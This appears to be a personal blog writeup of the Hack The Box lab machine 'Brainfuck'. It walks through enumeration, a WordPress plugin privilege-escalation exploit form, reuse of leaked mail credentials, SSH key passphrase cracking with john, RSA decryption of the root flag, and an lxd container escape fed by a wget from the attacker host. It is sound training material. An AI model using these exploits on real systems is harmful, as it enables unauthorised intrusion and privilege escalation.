---
title: Writeup - HTB Brainfuck
date: 2023-11-03
author: kei5uke
description: Writeup for HTB Brainfuck
tags:
  - linux
  - writeup
---

# Brainfuck

# Enumeration

## Nmap

```bash
┌──(root💀kali)-[~/brain]
└─# nmap -sV -sC -sT -T4 -p- 10.129.228.97 -oN nmap.txt
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-01 20:02 EET
Nmap scan report for 10.129.228.97
Host is up (0.040s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)
|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)
|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)
25/tcp  open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: UIDL USER AUTH-RESP-CODE SASL(PLAIN) TOP CAPA PIPELINING RESP-CODES
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: more have AUTH=PLAINA0001 LITERAL+ LOGIN-REFERRALS SASL-IR post-login ENABLE IMAP4rev1 OK capabilities Pre-login listed IDLE ID
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
|_http-server-header: nginx/1.10.0 (Ubuntu)
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|_  http/1.1
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Not valid before: 2017-04-13T11:19:29
|_Not valid after:  2027-04-11T11:19:29
|_http-title: Welcome to nginx!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 336.29 seconds
```

## Gobuster

```bash
┌──(root💀kali)-[~/brain]
└─# gobuster dir -u https://10.129.228.97/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt -k
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.129.228.97/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/11/01 20:25:59 Starting gobuster in directory enumeration mode
===============================================================
Progress: 23987 / 30001 (79.95%)[ERROR] 2023/11/01 20:28:14 [!] parse "https://10.129.228.97/error\x1f_log": net/url: invalid control character in URL
Progress: 30000 / 30001 (100.00%)
===============================================================
2023/11/01 20:28:46 Finished
===============================================================
```

## IMAP 143

```bash
┌──(root💀kali)-[~]
└─# nc 10.129.228.97 143                                                                
* OK [CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE IDLE AUTH=PLAIN] Dovecot ready.
HELO
HELO BAD Error in IMAP command received by server.
HELLO
HELLO BAD Error in IMAP command received by server.
A1 LOGIN root root
A1 NO [AUTHENTICATIONFAILED] Authentication failed.
A1 LOGIN brainfuck brainfuck
A1 NO [AUTHENTICATIONFAILED] Authentication failed.
```

# DNS

Added www.brainfuck.htb, sup3rs3cr3t.brainfuck.htb, and brainfuck.htb to /etc/hosts. Discovered a WordPress site and a forum.

# Wordpress

## wpscan

```bash
┌──(root💀kali)-[~/brain]
└─# wpscan --url https://brainfuck.htb --disable-tls-checks                                                              4 ⨯
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.18
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: https://brainfuck.htb/ [10.129.228.97]
[+] Started: Thu Nov  2 01:08:41 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: nginx/1.10.0 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: https://brainfuck.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: https://brainfuck.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: https://brainfuck.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.7.3 identified (Insecure, released on 2017-03-06).
 | Found By: Rss Generator (Passive Detection)
 |  - https://brainfuck.htb/?feed=rss2, <generator>https://wordpress.org/?v=4.7.3</generator>
 |  - https://brainfuck.htb/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.7.3</generator>

[+] WordPress theme in use: proficient
 | Location: https://brainfuck.htb/wp-content/themes/proficient/
 | Last Updated: 2023-11-01T00:00:00.000Z
 | Readme: https://brainfuck.htb/wp-content/themes/proficient/readme.txt
 | [!] The version is out of date, the latest version is 6.8
 | Style URL: https://brainfuck.htb/wp-content/themes/proficient/style.css?ver=4.7.3
 | Style Name: Proficient
 | Description: Proficient is a Multipurpose WordPress theme with lots of powerful features, instantly giving a prof...
 | Author: Specia
 | Author URI: https://speciatheme.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0.6 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://brainfuck.htb/wp-content/themes/proficient/style.css?ver=4.7.3, Match: 'Version: 1.0.6'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] wp-support-plus-responsive-ticket-system
 | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/
 | Last Updated: 2019-09-03T07:57:00.000Z
 | [!] The version is out of date, the latest version is 9.1.2
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 7.1.3 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:02 <==============================================> (137 / 137) 100.00% Time: 00:00:02

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Nov  2 01:08:47 2023
[+] Requests Done: 173
[+] Cached Requests: 5
[+] Data Sent: 43.166 KB
[+] Data Received: 203.026 KB
[+] Memory used: 247.551 MB
[+] Elapsed time: 00:00:06
```

Identified WordPress version 4.7.3 and a vulnerable plugin: wp-support-plus-responsive-ticket-system version 7.1.3.  

[WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation](https://www.exploit-db.com/exploits/41006)

Used a known exploit for the vulnerable plugin to escalate privileges and gain admin access.  

```bash
<form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
	Username: <input type="text" name="username" value="administrator">
	<input type="hidden" name="email" value="sth">
	<input type="hidden" name="action" value="loginGuestFacebook">
	<input type="submit" value="Login">
</form>
```

![Screenshot 2023-11-02 at 16.32.59.png](Brainfuck%20f7db271922f44bf3830540fd4da65ac8/Screenshot_2023-11-02_at_16.32.59.png)

![Screenshot 2023-11-02 at 16.33.54.png](Brainfuck%20f7db271922f44bf3830540fd4da65ac8/Screenshot_2023-11-02_at_16.33.54.png)

Obtained admin credentials and discovered SMTP credentials in the plugin settings.  

```bash
┌──(root💀kali)-[~]
└─# nc 10.129.228.97 110                                                         
+OK Dovecot ready.
USER orestis
+OK
PASS kHGuERB29DNiNE
+OK Logged in.

-ERR Unknown command: 
list
+OK 2 messages:
1 977
2 514
.
retr 1
+OK 977 octets
Return-Path: <www-data@brainfuck.htb>
X-Original-To: orestis@brainfuck.htb
Delivered-To: orestis@brainfuck.htb
Received: by brainfuck (Postfix, from userid 33)
	id 7150023B32; Mon, 17 Apr 2017 20:15:40 +0300 (EEST)
To: orestis@brainfuck.htb
Subject: New WordPress Site
X-PHP-Originating-Script: 33:class-phpmailer.php
Date: Mon, 17 Apr 2017 17:15:40 +0000
From: WordPress <wordpress@brainfuck.htb>
Message-ID: <00edcd034a67f3b0b6b43bab82b0f872@brainfuck.htb>
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8

Your new WordPress site has been successfully set up at:

https://brainfuck.htb

You can log in to the administrator account with the following information:

Username: admin
Password: The password you chose during the install.
Log in here: https://brainfuck.htb/wp-login.php

We hope you enjoy your new site. Thanks!

--The WordPress Team
https://wordpress.org/
.
retr 2
+OK 514 octets
Return-Path: <root@brainfuck.htb>
X-Original-To: orestis
Delivered-To: orestis@brainfuck.htb
Received: by brainfuck (Postfix, from userid 0)
	id 4227420AEB; Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
To: orestis@brainfuck.htb
Subject: Forum Access Details
Message-Id: <20170429101206.4227420AEB@brainfuck>
Date: Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
From: root@brainfuck.htb (root)

Hi there, your credentials for our "secret" forum are below :)

username: orestis
password: kIEnnfEKJ#9UmdO
```

After logging as orestis, I found interesting forum page and figured that they are encrypted with Viginere cipher.

![Screenshot 2023-11-02 at 16.36.19.png](Brainfuck%20f7db271922f44bf3830540fd4da65ac8/Screenshot_2023-11-02_at_16.36.19.png)

Kasiski analysis: Key length is 11, possibly.

![Screenshot 2023-11-02 at 16.19.25.png](Brainfuck%20f7db271922f44bf3830540fd4da65ac8/Screenshot_2023-11-02_at_16.19.25.png)

Key might be “FUCKMYBRAIN”

![Screenshot 2023-11-02 at 16.19.46.png](Brainfuck%20f7db271922f44bf3830540fd4da65ac8/Screenshot_2023-11-02_at_16.19.46.png)

Gatcha.

![Screenshot 2023-11-02 at 16.20.29.png](Brainfuck%20f7db271922f44bf3830540fd4da65ac8/Screenshot_2023-11-02_at_16.20.29.png)

id_rsa has passphrase *sigh*

```bash
┌──(root💀kali)-[~/brain]
└─# ssh orestis@10.129.228.97 -i ./id_rsa                                                                              255 ⨯
Enter passphrase for key './id_rsa': 
Enter passphrase for key './id_rsa': 
Enter passphrase for key './id_rsa': 
orestis@10.129.228.97: Permission denied (publickey).
```

[](https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/ssh2john.py)

I made id_rsa into hash and got john to crack it.

```bash
┌──(root💀kali)-[/opt]
└─# python3 ssh2john.py ~/brain/id_rsa 
/root/brain/id_rsa:$sshng$1$16$6904FEF19397786F75BE2D7762AE7382$1200$9a779a83f60263c001f8e2ddae0b722aa9eb7531f09a95864cd5bda5f847b0dcfc09f19d03181c8546877a84e3feb87f0769d2e3ef426012bc211dd5b79168ecfa160428c0030598971f9c2b4c350d7a9adc0f812e5b122342b0b3d8de6ba1a25b599afd5ed6a0927e57824d23bb9f4e143238450eefa3e560d44cf54105f0c00d42624adfb31df44ceee77c09a54a99edd29c83a00cfe8f5584e969897ed220d4fd75129a29ebce8e8a516f210532588fd351fb6656a158f7514667c25d2990cf11fd2369462104ed451037ac592d2e935e74d3ee650092b3051e73b79556dda673666ff4f33d9424c9b914b3cd5ba6a33dd712785a1a63f58e63285415a20fed91ae72fac27cfd92cb15fad802574983f7b592fb5c9d5843de0a9874e8c7a674b4762f5baf04625ebfc8bd84fded869d68c2f33c1e089dc9f302daf381bd76dc000ddb0cabd1e23b33da86dfe4017e16fb7aa6632e8b1f216e2a4fd75d94b39e324effe1c82f8ce60d61594ba3e72e31a2f82bd0b2df236a467be16fe655d399cce773566a0d8e65ae5996cd3bec5bb87bae6f4b2a01221e7f601a0aa23a544a9f915497e0e57da00c1d689850a62c2d2315bc323ac3cf2065bd74d8a0f6938355d0fe8e7572022403046b59923a4fcb4bf98b3b87b4377c045fe36d8156eaba5f60b929686dab085f90e401c63e111de3fbf61e7e9c849d8b3efed7d34f5a0cf814774d54a525c3abbcd9ab232e7d92b295b6e97101e8d5433c489963940d80bde3b4d7bbd040b21d0c2e82ada4844bdc771bbbebe2f4be679f92e484efd581d3323b2013a2bec09aedb16fddce3b9e572a4075962c36ae55a0eac0695ccd56520a0c416e7429ea3a3b48f37867c057098cef65db6ae82684a5b6e6aff8ebfc8be1530ab83c872f91dcf8ebf9bf76d0f74f29f94adfd38769be3f528c1ce7b1c86aa33a20702d547c97029ba725fbdebb18505adeb0f9603a77c76c72215f5241dc06bc7d1921ca7474a2a431566d517f214eabf544e4780a4f06d7333a59ce10a87e8352a1a2dedafb9d8c32ef0c75249e96461a7259d2feb2ef1ff7a2a717b83064bb553fceddf11dee0044599f114ef4cb8e654dbe3c49c35dd48248cbf7a97f45bcf618dce3ca6ecc62032f8cc197b32cd8a9f345e671527019462c767fa207f50f31d757d76277d1851bb70fd1df84d08911548562d316b98e68b69b22a9792fed0911b799f4ee7a0da5c5a8fde05e1331f3104a5106b1d9ec684eb7a8c42239edac41401a9384483f1d30b22103e61d6dfa9b1b5cf8894c0c4c5d2c7583ee69cdb88752862011e9b5d861233713bdb97f32c4d4c16ee395641c38859b1cbd11543ebf8f64838c85c1434f3dbb0ea6929cee0256a52d58fe2fab0ca83c64d5774c86f94c0a88a9046066aa4f0af7cf46998b511427be5cbcf575fdec918945218985b002a943199dfc05a7167c68fb15c2ca17472bae6f8ddaec6b45f438b209b846b85db361c98a8d1e4438e4fb1ec82a40870038c216e79ab6149a6a1f5f8f53c7887c5ce4854634aa819210116466e08fcae8d8393caf4197b0c9df9ac7bdc7388ed91e8cbc0b10e48d26c85f200bc806bb229dda81db4e3e79a2ea10fe8f1bdba71160f2281db59961f4fb1f22090d64af11aa73f29803c2caf466f1ceef6451f84b04200f91574f0190
```

```bash
┌──(root💀kali)-[~/brain]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 3 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
3poulakia!       (/root/brain/id_rsa)
1g 0:00:00:03 DONE (2023-11-02 16:42) 0.3205g/s 4596Kp/s 4596Kc/s 4596KC/s     1990..*7¡Vamos!
Session completed
```

# Shell

By using the key obtained and password cracked with john, I got shell as orestis.

```bash
┌──(root💀kali)-[~/brain]
└─# ssh orestis@10.129.228.97 -i ./id_rsa                                                           
Enter passphrase for key './id_rsa': 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-75-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

You have mail.
Last login: Mon Oct  3 19:44:28 2022 from 10.10.14.23
orestis@brainfuck:~$ ls
debug.txt  encrypt.sage  mail  output.txt  user.txt
orestis@brainfuck:~$ cat user.txt
2c11cfbc5b959f73ac15a3310bd097c9
```

I found interesting files in the home folder.

Seems like `encrypt.sage` outputs root flag based on the randomly generated keys.

Lucky thing, p and q values are stored in debug.txt and we can reverse engineer this somehow.

```bash
orestis@brainfuck:~$ cat output.txt 
Encrypted Password: 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182
orestis@brainfuck:~$ cat debug.txt 
7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
orestis@brainfuck:~$ cat encrypt.sage 
nbits = 1024

password = open("/root/root.txt").read().strip()
enc_pass = open("output.txt","w")
debug = open("debug.txt","w")
m = Integer(int(password.encode('hex'),16))

p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
n = p*q
phi = (p-1)*(q-1)
e = ZZ.random_element(phi)
while gcd(e, phi) != 1:
    e = ZZ.random_element(phi)

c = pow(m, e, n)
enc_pass.write('Encrypted Password: '+str(c)+'\n')
debug.write(str(p)+'\n')
debug.write(str(q)+'\n')
debug.write(str(e)+'\n')
```

It turned out that this is RSA and the script in the link below can crack the case.

[RSA given q, p and e?](https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e)

```bash
def egcd(a, b):
    x,y, u,v = 0,1, 1,0
    while a != 0:
        q, r = b//a, b%a
        m, n = x-u*q, y-v*q
        b,a, x,y, u,v = a,r, u,v, m,n
        gcd = b
    return gcd, x, y

def main():

    p = 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
    q = 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
    e = 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
    ct = 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182

    # compute n
    n = p * q

    # Compute phi(n)
    phi = (p - 1) * (q - 1)

    # Compute modular inverse of e
    gcd, a, b = egcd(e, phi)
    d = a

    print( "n:  " + str(d) );

    # Decrypt ciphertext
    pt = pow(ct, d, n)
    print( "pt: " + str(pt) )

    # Decode the pt from hex to string
    print(bytes.fromhex(f"{pt:x}").decode())

if __name__ == "__main__":
    main()
```

I got the code.

```bash
~/tmp  python3 decrypt.py
n:  8730619434505424202695243393110875299824837916005183495711605871599704226978295096241357277709197601637267370957300267235576794588910779384003565449171336685547398771618018696647404657266705536859125227436228202269747809884438885837599321762997276849457397006548009824608365446626232570922018165610149151977
pt: 24604052029401386049980296953784287079059245867880966944246662849341507003750
6efc1a5dbb8904751ce6566a305bb8ef
```

# Alternative pwn root

orestis belongs to the user lxd, this can be used to escalated privilege.

Follow the procedure below:

[lxd/lxc Group - Privilege escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)

```bash
orestis@brainfuck:/tmp$ wget http://10.10.16.17/alpine-v3.8-i686-20231103_2308.tar.gz
--2023-11-03 23:09:57--  http://10.10.16.17/alpine-v3.8-i686-20231103_2308.tar.gz
Connecting to 10.10.16.17:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2688693 (2.6M) [application/gzip]
Saving to: ‘alpine-v3.8-i686-20231103_2308.tar.gz’

alpine-v3.8-i686-20231103_2308. 100%[====================================================>]   2.56M  2.29MB/s    in 1.1s    

2023-11-03 23:09:59 (2.29 MB/s) - ‘alpine-v3.8-i686-20231103_2308.tar.gz’ saved [2688693/2688693]

orestis@brainfuck:/tmp$ ls
44298.cpp                                 systemd-private-0e67eb0140b54d09bf939accd67f244b-dovecot.service-N01XPR
alpine-v3.13-x86_64-20210218_0139.tar.gz  systemd-private-0e67eb0140b54d09bf939accd67f244b-systemd-timesyncd.service-JEj2dH
alpine-v3.8-i686-20231103_2308.tar.gz     tmux-1000
linpeas.sh                                vmware-root
orestis@brainfuck:/tmp$ cp alpine* ~/
orestis@brainfuck:/tmp$ cd ~
orestis@brainfuck:~$ lxc image import ./alpine*.tar.gz --alias myimage
Image imported with fingerprint: ab6df67ab0d550d357dedcce7c253b35f68eb9fb80fd207fad16800fbb1fd028
orestis@brainfuck:~$ lxd init
error: This must be run as root
orestis@brainfuck:~$ sudo lxd init
[sudo] password for orestis: 
Sorry, try again.
[sudo] password for orestis: 
Sorry, try again.
[sudo] password for orestis: 

sudo: 3 incorrect password attempts
orestis@brainfuck:~$ 
orestis@brainfuck:~$ lxc init myimage mycontainer -c security.privileged=true
Creating mycontainer
orestis@brainfuck:~$ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to mycontainer
orestis@brainfuck:~$ lxc start mycontainer
orestis@brainfuck:~$ lxc exec mycontainer /bin/sh
~ # whoami
root
~ # ls
~ # pwd
/root
~ # cd ..
/ # ls
bin            home           metadata.yaml  proc           run            sys            usr
dev            lib            mnt            root           sbin           templates      var
etc            media          opt            rootfs         srv            tmp
/ # cd ..
/ # ls
bin            home           metadata.yaml  proc           run            sys            usr
dev            lib            mnt            root           sbin           templates      var
etc            media          opt            rootfs         srv            tmp
/ # cd root
~ # ls
~ # cd root
/bin/sh: cd: can't cd to root: No such file or directory
~ # cd /mnt/root
/mnt/root # ls
bin         etc         lib         media       proc        sbin        sys         var
boot        home        lib64       mnt         root        snap        tmp         vmlinuz
dev         initrd.img  lost+found  opt         run         srv         usr
/mnt/root # cd root
/mnt/root/root # ls
root.txt
/mnt/root/root # cat root.txt
6efc1a5dbb8904751ce6566a305bb8ef
```

# Note

Don’t forget to add DNS to /etc/hosts 😢
I wasted hours because of this